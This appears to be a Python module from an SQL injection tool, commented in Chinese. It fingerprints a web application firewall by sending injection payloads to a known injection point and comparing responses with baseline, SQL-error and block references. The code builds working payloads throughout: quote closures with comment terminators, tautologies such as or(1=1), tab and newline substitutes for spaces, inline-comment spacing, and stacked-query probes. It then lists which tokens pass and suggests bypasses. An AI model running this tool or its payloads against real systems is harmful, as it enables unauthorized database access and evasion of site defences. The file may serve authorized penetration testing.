"""WAF 检测：字典 fuzz + 响应差异判定，输出过滤清单。

判定模型（三类参照响应）：
- R_base：正常请求 → payload 中 token 被剥离/转义时响应与之高度一致
- R_err ：SQL 报错页  → token 到达解析器时（无论如何都会语法报错）
- block ：WAF 拦截特征（状态码/关键词）

通用探针：base+closure+token+comment
  → SQL 报错        = token 通过（可用）
  → 与基线一致       = token 被剥离/转义（已过滤）
  → WAF 拦截特征    = 已过滤（激进拦截）
  → 其他            = 未知
"""
from __future__ import annotations

from pathlib import Path
from typing import Optional

import yaml

from .models import (BYPASS_SUGGESTIONS, InjectionPoint, ResponseInfo, WafItem,
                     WafReport, similarity)
from .session import HttpSession

DICT_DIR = Path(__file__).resolve().parent.parent / "dictionaries"


class WafScanner:
    def __init__(self, session: HttpSession, injection: InjectionPoint,
                 R_base: Optional[ResponseInfo] = None,
                 R_err: Optional[ResponseInfo] = None):
        self.s = session
        self.inj = injection
        self.log = session.log
        self.R_base = R_base or session.request_value(session.spec.base_value)
        if R_err is not None:
            self.R_err = R_err
        else:
            pre = self._prefix()
            self.R_err = session.request_value(pre)   # 闭合本身 → 报错参照
        # 报错参照有效吗？（登录框吞错/无区分环境下 R_err ≡ R_base，"error/base"
        # 二分失效，此时 base 类结果只能记"未知"）
        self.err_valid = (self.R_err.has_sql_error()
                          or similarity(self.R_err, self.R_base) < 0.99)
        self.kw_dict = self._load("waf_keywords.yaml")
        self.sym_dict = self._load("waf_symbols.yaml")

    # ------------------------------------------------------------------ helpers
    @staticmethod
    def _load(name):
        with open(DICT_DIR / name, encoding="utf-8") as f:
            return yaml.safe_load(f)

    def _prefix(self) -> str:
        if self.inj.numeric:
            return self.inj.base_value
        return self.inj.base_value + self.inj.closure

    def _tail(self) -> str:
        return self.inj.comment if self.inj.comment != "quote-close" else ""

    def _classify(self, r: ResponseInfo) -> str:
        if r.status_code < 0:
            return "other"
        if r.has_waf_block():
            return "block"
        if r.has_sql_error():
            return "error"
        if self.err_valid and self.R_err is not None and self.R_err.length and \
                similarity(r, self.R_err) >= 0.93 and r.status_code == self.R_err.status_code:
            return "error"
        if similarity(r, self.R_base) >= 0.985 and r.status_code == self.R_base.status_code:
            return "base"
        return "other"

    def _record(self, report: WafReport, token: str, category: str, cls: str,
                note: str = "", trust: bool = False) -> WafItem:
        """trust=True 表示结论来自自参照法（独立成功参照），不受 err_valid 影响。"""
        if cls == "error":
            filtered, ev = False, f"token 到达数据库解析器（SQL 报错）{note}"
        elif cls == "block":
            filtered, ev = True, f"触发拦截（WAF 特征响应）{note}"
        elif cls == "base":
            if self.err_valid or trust:
                filtered, ev = True, f"token 被剥离/转义（响应与正常基线一致）{note}"
            else:
                # 无报错区分度的环境（登录框吞错等）：语义不可见 ≠ 被剥离
                filtered, ev = None, "无报错回显，无法区分「语义不可见」与「被剥离」"
        else:
            filtered, ev = None, "响应特征不明确"
        item = WafItem(token=token, category=category, filtered=filtered,
                       evidence=ev, suggestion=BYPASS_SUGGESTIONS.get(token, ""))
        report.add(item)
        self.log("INFO", f"[WAF] {token!r}: {item.status_text} ({cls})")
        return item

    # ------------------------------------------------------------------ main
    def scan(self, keywords: bool = True, functions: bool = True,
             symbols: bool = True) -> WafReport:
        report = WafReport()
        pre, tail = self._prefix(), self._tail()

        if keywords:
            for e in self.kw_dict["keywords"]:
                if self.s.stopped:
                    break
                self._probe_generic(report, e["token"], e["category"], pre, tail)
        if functions:
            for e in self.kw_dict["functions"]:
                if self.s.stopped:
                    break
                self._probe_generic(report, e["token"], e["category"], pre, tail)
        if symbols:
            for e in self.sym_dict["symbols"]:
                if self.s.stopped:
                    break
                self._probe_symbol(report, e["token"], pre, tail)

        n = len(report.filtered_list())
        self.log("INFO", f"WAF 扫描完成: {len(report.items)} 项中 {n} 项被过滤"
                 + ("" if n else "（未检出过滤，疑似无 WAF）"))
        return report

    def _probe_generic(self, report: WafReport, token: str, category: str,
                       pre: str, tail: str):
        payload = f"{pre}{token}{tail}"          # 如 1'and# → 报错=通过；1'# → 正常=被剥离
        r = self.s.request_value(payload)
        self._record(report, token, category, self._classify(r))

    def _probe_symbol(self, report: WafReport, token: str, pre: str, tail: str):
        special = {
            "space": self._probe_space,
            "'": self._probe_single_quote,
            '"': self._probe_double_quote,
            "#": self._probe_hash,
            "--": self._probe_dashdash,
            "/*": self._probe_inline,
            ";": self._probe_semicolon,
        }
        if token in special:
            special[token](report, token, pre, tail)
        else:
            payload = f"{pre}{token}{tail}"      # 如 1',# → 报错=通过
            r = self.s.request_value(payload)
            self._record(report, token, "符号", self._classify(r))

    # ------------------------------------------------------------------ special probes
    def _probe_space(self, report: WafReport, token: str, pre: str, tail: str):
        """空格探针（自参照法，无条件执行）：
        以无空格恒真 1'or(1=1)# 的响应为成功参照 R_true，
        含空格恒真 1' or 1# 与之相似 = 通过；否则被滤。
        空格被滤时继续探测空白替代 %09 / %0a。"""
        r_true = self.s.request_value(f"{pre}or(1=1){tail}")
        if r_true.status_code > 0 and not r_true.has_waf_block() \
                and not r_true.has_sql_error():
            r = self.s.request_value(f"{pre} or 1{tail}")
            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
                self._record(report, token, "符号", "error",
                             note="（含空格恒真与无空格恒真页面一致）", trust=True)
                return
            self._record(report, token, "符号", "base",
                         note="（含空格恒真页面偏离成功参照，空格被过滤/拦截）", trust=True)
            self._probe_whitespace_alts(report, pre, tail, r_true)
            return
        # or 恒真不可用（如 or 被滤）→ and 真假差异兜底
        and_item = report.lookup("and")
        if and_item is not None and and_item.filtered is False:
            t = self.s.request_value(f"{pre} and 1=1{tail}")
            f = self.s.request_value(f"{pre} and 1=2{tail}")
            if (self._classify(t) == "base" and t.status_code > 0
                    and (similarity(t, f) < 0.995 or t.status_code != f.status_code)):
                self._record(report, token, "符号", "error")
                return
        self._record(report, token, "符号", "other", note="（无法构造有效恒真参照）")

    def _probe_whitespace_alts(self, report: WafReport, pre: str, tail: str,
                               r_true):
        """空格被滤时，探测 tab(%09) / 换行(%0a) 是否可作为空白替代。"""
        for name, literal in (("%09", "\t"), ("%0a", "\n")):
            r = self.s.request_value(f"{pre}{literal}or{literal}1{tail}")
            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
                self._record(report, name, "符号", "error",
                             note="（空白替代字符可用，自参照恒真一致）", trust=True)
            else:
                self._record(report, name, "符号", "base",
                             note="（空白替代字符同样被拦截）", trust=True)

    def _probe_single_quote(self, report: WafReport, token: str, pre: str, tail: str):
        r = self.s.request_value(self.inj.base_value + "'")
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error")
            return
        # 自参照法：无引号恒真 vs 含引号恒真（'a'='a'）页面比对
        r_ref = self.s.request_value(f"{pre}/**/and/**/1=1{tail}")
        r_quote = self.s.request_value(f"{pre}/**/and/**/'a'='a'{tail}")
        if r_ref.status_code > 0 and similarity(r_ref, r_quote) >= 0.98 \
                and r_ref.status_code == r_quote.status_code:
            self._record(report, token, "符号", "error",
                         note="（含引号恒真与无引号恒真一致，引号可用）", trust=True)
        elif r_ref.status_code > 0 and similarity(r_ref, r_quote) < 0.95:
            self._record(report, token, "符号", "base",
                         note="（含引号恒真失败而无引号恒真成功，引号被过滤/剥离）",
                         trust=True)
        elif not self.err_valid:
            self._record(report, token, "符号", None,
                         note="（无报错回显，请以闭合探测结果为准）")
        else:
            self._record(report, token, "符号", "base",
                         note="（引号被转义或过滤，字符串逃逸失败）")

    def _probe_double_quote(self, report: WafReport, token: str, pre: str, tail: str):
        r = self.s.request_value(self.inj.base_value + '"')
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error")
        elif self.inj.closure.startswith("'"):
            # 单引号上下文中 " 本就是普通数据，不构成逃逸要素，标记为不适用
            self._record(report, token, "符号", None,
                         note="（当前为单引号闭合，双引号作为数据处理）")
        else:
            self._record(report, token, "符号", cls)

    def _probe_hash(self, report: WafReport, token: str, pre: str, tail: str):
        """1'# → 正常=通过；报错=被剥离；拦截=被过滤。"""
        r = self.s.request_value(f"{pre}#")
        cls = self._classify(r)
        if cls == "base":
            self._record(report, token, "符号", "error")   # 通过（语义上可用）
        elif cls == "error":
            self._record(report, token, "符号", "base", note="（# 被剥离，残留引号报错）")
        else:
            self._record(report, token, "符号", cls)

    def _probe_dashdash(self, report: WafReport, token: str, pre: str, tail: str):
        r = self.s.request_value(f"{pre}-- ")
        cls = self._classify(r)
        if cls == "base":
            self._record(report, token, "符号", "error")
        elif cls == "error":
            self._record(report, token, "符号", "base", note="（-- 被剥离）")
        else:
            self._record(report, token, "符号", cls)

    def _probe_inline(self, report: WafReport, token: str, pre: str, tail: str):
        """MariaDB 未闭合 /* 自身报错，改用完整内联注释替代空格：
        1'/**/order/**/by/**/3# → 报错=/**/ 生效（可用）。"""
        if report.lookup("order") and report.lookup("order").filtered:
            self._record(report, token, "符号", "other", note="（order 不可用，无法判定）")
            return
        r = self.s.request_value(f"{pre}/**/order/**/by/**/3{tail}")
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error",
                         note="（order by 3 必报错，说明 /**/ 作为空格替代生效）")
        elif cls == "block":
            self._record(report, token, "符号", "block")
        elif cls == "base":
            self._record(report, token, "符号", "base",
                         note="（order by 3 未报错，/**/ 疑似被剥离或失效）")
        else:
            self._record(report, token, "符号", "other")

    def _probe_semicolon(self, report: WafReport, token: str, pre: str, tail: str):
        """1';(select 1)# → 多语句被 mysqli 拒绝而报错 = 分号通过。"""
        if report.lookup("select") is not None and report.lookup("select").filtered:
            self._record(report, token, "符号", "other", note="（select 不可用，无法判定）")
            return
        r = self.s.request_value(f"{pre};(select 1){tail}")
        cls = self._classify(r)
        self._record(report, token, "符号", cls,
                     note="（多语句拒绝报错=分号到达解析器）")
